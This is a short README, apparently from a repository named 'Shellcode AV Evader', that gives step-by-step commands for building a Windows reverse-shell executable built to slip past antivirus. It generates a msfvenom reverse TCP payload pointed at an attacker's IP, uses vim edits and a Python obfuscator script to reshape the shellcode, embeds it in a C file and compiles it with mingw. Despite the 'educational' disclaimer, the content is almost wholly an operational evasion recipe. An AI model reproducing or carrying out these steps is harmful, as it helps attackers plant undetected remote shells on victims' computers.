# Shellcode AV Evader
This project main only educational porpouses, the idea was based on
speechs of @Mr.Un1k0d3r and @mr.d0x

--- 

## Generate payload
`$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f c -o shellcode_c_payload.txt`

---

## open on vim
$ vim shellcode_c_payload.txt
```
:g /buf/d                   delete the line that contains "buf"
:s/;//                      remove `;`
:%s/"\(.*\)"/\1/            remove `"`
:%join                      join all lines in one
:s/\s\+//g                  remove blank spaces
:s/\(\\.\{3\}\)/"\1",/g     

result in string: "\xde",\xad","\xbe","\xef"...
```
after saving you can easily copy to clipboard using\
`$ cat shellcode_c_payload.txt | xclip -selection clipboard`

---

open file **dictionary_obfuscator.py** and paste the shellcode in the correct place

after running the code, take note of the length of the payload and 
use any text editor to remove `[`, `]` and replace all`'` for `"`

---
open file **reverse_shell.c**, paste the payload from python in the correct place as the size

---
compile with\
`$ x86_64-w64-mingw32-gcc -o shell.exe reverse_shell.c`


